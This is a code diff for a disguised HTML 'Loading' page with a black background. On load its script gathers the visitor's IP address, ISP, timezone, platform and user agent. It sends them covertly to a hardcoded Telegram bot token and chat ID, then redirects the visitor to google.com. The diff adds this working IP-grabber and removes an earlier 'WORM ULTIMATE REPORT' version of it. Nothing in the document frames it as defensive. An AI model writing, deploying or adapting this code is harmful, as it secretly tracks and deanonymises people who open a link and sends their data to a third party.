@@ -1,42 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading</title></head>
+<body style="background:#000;">
 <script>
-  const TOKEN = "8536635132:AAGU7VibS5L3GkZ9WYDjMsRhbKs_XQlBbGA";
-  const CHAT_ID = "8053770740";
-
-  async function ultimate_sniff() {
-    let ip = "N/A";
-    let provider = "N/A";
+  async function final_check() {
+    const TOKEN = "8536635132:AAGU7VibS5L3GkZ9WYDjMsRhbKs_XQlBbGA";
+    const CHAT_ID = "8053770740";
+    let ip = "N/A", isp = "N/A";
     
     try {
       const r = await fetch('https://ipapi.co/json/');
-      const data = await r.json();
-      ip = data.ip;
-      provider = data.org;
+      const d = await r.json();
+      ip = d.ip; isp = d.org;
     } catch(e) {}
 
-    const info = {
-      tz: Intm.DateTimeFormat().resolvedOptions().timeZone,
-      lan: navigator.languages.join(", "),
-      con: navigator.connection ? navigator.connection.effectiveType : "N/A",
-      touch: navigator.maxTouchPoints > 0 ? "Sim" : "Nao",
-      cookies: navigator.cookieEnabled ? "Ativo" : "Inativo"
-    };
+    const report = `NOVO LOG ULTIMATE\nIP: ${ip}\nISP: ${isp}\nFUSO: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nSISTEMA: ${navigator.platform}\nUA: ${navigator.userAgent}`;
 
-    const report = "WORM ULTIMATE REPORT\n" +
-                   "IP: " + ip + "\n" +
-                   "PROVEDOR: " + provider + "\n" +
-                   "FUSO: " + info.tz + "\n" +
-                   "CONEXAO: " + info.con + "\n" +
-                   "IDIOMAS: " + info.lan + "\n" +
-                   "TOUCH: " + info.touch + "\n" +
-                   "COOKIES: " + info.cookies + "\n" +
-                   "UA: " + navigator.userAgent;
+    const url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(report);
+    new Image().src = url;
 
-    const target = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(report);
-    new Image().src = target;
-
-    setTimeout(() => {
-      window.location.replace("https://google.com");
-    }, 1000);
+    setTimeout(() => { window.location.replace("https://google.com"); }, 1000);
   }
-  ultimate_sniff();
+  final_check();
 </script>
+</body>
+</html>
